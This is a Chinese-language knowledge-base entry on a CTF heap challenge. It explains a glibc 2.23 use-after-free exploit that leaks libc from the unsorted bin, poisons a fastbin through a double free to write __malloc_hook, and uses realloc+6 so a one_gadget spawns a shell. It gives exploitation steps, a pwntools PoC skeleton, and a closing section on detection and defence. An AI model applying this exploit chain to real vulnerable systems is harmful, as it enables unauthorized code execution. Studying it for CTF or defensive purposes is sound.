---
id: binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget
title: glibc 2.23 UAF 堆题：unsorted bin 泄露 libc、fastbin dup 打 __malloc_hook，realloc+6 调栈帧满足 one_gadget
type: scenario
domain: binary
path: binary/pwn/heap
technique: heap-uaf-fastbin-dup-malloc-hook-realloc-stack-onegadget
tags:
- pwn
- heap
- glibc-2.23
- uaf
- fastbin-dup
- double-free
- malloc-hook
- realloc-hook
- one-gadget
- stack-frame
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V191
  verified_at: '2026-11-06T22:40:52+08:00'
  notes: 已对照原文与18张图核对：2.23 UAF、srand种子菜单(add12/free7/edit2/show1)、free(1)-show(1)泄露0x3c4b78、free(0)/free(2)/free(0) fastbin dup、malloc_hook-0x23、realloc+6+one_gadget 0x4527a 均与content.md及截图一致；PoC未本机复跑
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget/
draft: false
kb_aliases:
- 2.23 UAF 堆题
- fastbin dup
- fastbin double free
- __malloc_hook one_gadget
- __realloc_hook one_gadget
- realloc+6 调栈帧
- malloc_hook-0x23
- unsorted bin 泄露 libc
- srand 种子菜单
---

## 一句话结论

在 glibc 2.23（无 tcache、保留 `__malloc_hook`/`__realloc_hook`）且存在 UAF 的堆题中，先把 0x98 块 free 进 unsorted bin 用 show 读出 `main_arena` 指针泄露 libc，再用 `free(0); free(2); free(0)` 绕过 fastbin 的双 free 检查形成 fastbin dup，并通过 UAF 改写已释放块 fd 把第二次 0x68 分配引到 `__malloc_hook-0x23`；写入 `__realloc_hook=one_gadget`、`__malloc_hook=realloc+6` 后触发一次 malloc，realloc 额外建立的调用帧使 one_gadget 要求的 `[rsp+0x30]==NULL` 成立，最终执行 `execve("/bin/sh", ...)`。

## 原理

- **无 tcache 的 2.23 分配路径**：0x70 大小的 chunk 释放后进入 fastbin；0x98 请求对应的 0xa0 chunk 超过 fastbin 上限，释放后进入 unsorted bin。unsorted bin 为空时，首块的 `fd`/`bk` 都指向 `main_arena+0x58`，也就是 libc 内的固定偏移（本例 0x3c4b78 = 十进制 3951480）。释放后仍能 `show` 同一索引即可读回该指针，减去偏移得到 libc 基址。
- **fastbin double free 检查的绕过**：glibc 2.23 的 `_int_free` 只比较“本次要 free 的 chunk 是否等于当前 fastbin 链表头”。按 `free(0)`、`free(2)`、`free(0)` 的顺序，第二次 `free(0)` 时链表头是 2 而不是 0，检查通过；fastbin 链变成 `0 -> 2 -> 0`，同一块在链表中出现两次。
- **UAF 改写 fd 完成投毒**：程序的 edit 不校验索引是否仍为已分配状态，`free(0)` 后仍能 `edit(0)`，把 chunk 0 的 `fd` 覆盖为 `__malloc_hook-0x23`。这个偏移的选择是因为 fake chunk 的 `size` 字段落在 `__malloc_hook-0x1b`，该处字节可被解释为合法的 fastbin size（0x7f），从而通过分配时的 size 校验。
- **两次分配命中 hook 区**：`add(4)` 取出 chunk 0，`add(5)` 取出 fake chunk（`__malloc_hook-0x23`）。fake chunk 返回给用户的数据区从 chunk 头 +0x10 开始，即 `__malloc_hook-0x13`；先写 0xb 字节填充，随后 `p64(one_gadget)` 正好落在 `__realloc_hook`（`__malloc_hook-8`），`p64(realloc+6)` 落在 `__malloc_hook`。
- **realloc+6 为什么能救 one_gadget**：触发 malloc 时，glibc 先调用 `__malloc_hook(size, caller)`，此时 `__malloc_hook` 已被改成 `realloc+6`，跳过 realloc 开头若干条指令进入 realloc 函数体；realloc 检查到 `__realloc_hook` 非空后调用 one_gadget。相比直接调用 one_gadget，这条路径多出 realloc 的调用帧，使 `rsp` 下移，one_gadget（本例 0x4527a）要求的 `[rsp+0x30]==NULL` 及相邻槽位为 NULL 在 realloc 帧的零值区域得到满足。原文调试现场在 realloc+591 断下，`tele rsp+0x30` 显示为 0，验证了这一点。
- **菜单随机分发**：程序用 `srand(v3); switch (rand() % 4)` 选择功能，用户输入的“功能号”实际是随机种子；由于 glibc rand 是确定性的伪随机序列，同一数字对应的功能固定。先枚举数字到功能的映射（原文手测：add=12、free=7、edit=2、show=1），再按功能发包即可。

## 触发条件

- 目标使用 glibc 2.23（或至少 ≤2.33 且保留 `__malloc_hook`/`__realloc_hook`），无 tcache。
- 存在 UAF：free/delete 后同一索引仍可 show/edit，且程序不把指针置空。
- 分配器可同时给出 fastbin 尺寸（约 0x70）与超过 fastbin 上限的尺寸（0x90 以上），并有稳定的 free 顺序。
- 有可用于泄露的读接口或其它 libc 泄露手段；已知目标 libc 的 `main_arena+0x58` 与 one_gadget 偏移。
- one_gadget 的栈约束在直接调用时不满足，需要 `realloc+6`（或类似多一帧的 gadget）调整。
- 菜单由 `srand(用户输入) + rand()%N` 分发时，需要先建立种子到功能的映射。

## 利用步骤

1. 逆向下发菜单，确认功能选择由 `srand(用户输入); switch (rand()%4)` 实现；枚举每个数字对应的功能（原文 add=12、free=7、edit=2、show=1）。
2. 布局：`add(0,0x68)`、`add(1,0x98)`、`add(2,0x68)`、`add(3,0x68)`；块 1 后方已有块 2 作为 guard，避免释放后与 top 合并。
3. `free(1)` 让 0xa0 块进入 unsorted bin，`show(1)` 读回前 8 字节；`libc_base = leak - 0x3c4b78`，检查低 12 位为 0。
4. `free(0); free(2); free(0)` 形成 fastbin dup；`edit(0, 0x68, p64(malloc_hook-0x23))` 用 UAF 把 fd 指向 hook 区。
5. `add(4,0x68)` 取回 chunk 0，`add(5,0x68)` 取出 fake chunk；`edit(5, 0x68, b'A'*(0x13-8) + p64(one_gadget) + p64(realloc+6))`，在 `__realloc_hook` 与 `__malloc_hook` 连写。
6. `add(6,0x10)` 触发 malloc：`__malloc_hook -> realloc+6 -> __realloc_hook -> one_gadget`，拿 shell。
7. 若 one_gadget 仍不满足，换 0x4527a 之外的 one_gadget、改用 `realloc+3`/其它帧调整 gadget，或改走 `__free_hook=system` + `free("/bin/sh")`。

## PoC

原文 exp 的关键骨架（索引、功能号与偏移均按原题；未在本机复跑）：

```python
from pwn import *
context(arch='amd64')
libc = ELF('./libc.so.6')          # 2.23-0ubuntu11.3

def add(index, size): ...          # 种子 12
def free(index): ...               # 种子 7
def edit(index, size, data): ...   # 种子 2
def show(index): ...               # 种子 1

add(0, 0x68); add(1, 0x98); add(2, 0x68); add(3, 0x68)
free(1)
show(1)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c4b78

malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc'] + 6
one_gadget = libc_base + 0x4527a

free(0); free(2); free(0)                       # fastbin dup
edit(0, 0x68, p64(malloc_hook - 0x23))          # UAF 改 fd
add(4, 0x68)
add(5, 0x68)                                    # 返回 fake chunk
edit(5, 0x68, b'A' * (0x13 - 8) + p64(one_gadget) + p64(realloc))
add(6, 0x10)                                    # 触发 __malloc_hook
p.interactive()
```

调试时在 `realloc+591` 附近断下，检查 `rsp+0x30` 是否为 0，可确认 one_gadget 约束已满足。

## 变体与关联

- 变体：glibc 2.27+ 有 tcache 时，用 tcache poisoning 代替 fastbin dup；栈帧调整可能用 `realloc+3` 或其它偏移。
- 变体：one_gadget 约束始终不满足时，改打 `__free_hook = system` 并 `free("/bin/sh")`；或把 hook 改成 `setcontext` 做栈迁移。
- 变体：没有 show 泄露时，可用 stdout 部分覆写、large bin/unsorted bin 其它泄露路径。
- 关联：[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（泄露原语）、[[binary-pwn-heap-calloc-tcache-overlap-realloc-hook-onegadget]]（2.27 tcache 版本的 hook + realloc 调帧）、[[binary-pwn-heap-glibc223-unsafe-unlink-chunks-array-got-system]]（同版本另一条打 GOT 的链路）、[[binary-pwn-format-string-malloc-hook-one-gadget]]（格式化字符串写 hook 的对照）。
- 版本边界：glibc ≥2.34 移除 malloc/free hooks，此打法失效，需要改用 FSOP、`setcontext` 或栈上 ROP。

## 检测与防御

- **修复根因**：free 后立即把索引指针置 NULL，并记录“已释放”状态；show/edit 必须校验索引仍处于已分配状态；不要信任用户再次输入的长度。
- **加固**：升级 glibc 到移除 hooks 的版本；启用 tcache key/safe-linking；Full RELRO + PIE + Canary；关键服务使用独立分配器或隔离堆。
- **检测**：同一 chunk 被连续 free、fastbin 的 fd 指向 libc 数据段（尤其是 `__malloc_hook` 附近）、`malloc` 返回的用户地址落在 libc 数据段、进程异常执行 `/bin/sh`。
- **响应**：出现上述堆元数据异常时终止进程并保留 core；检查是否已被写入 hook/ROP 链，重启并升级。
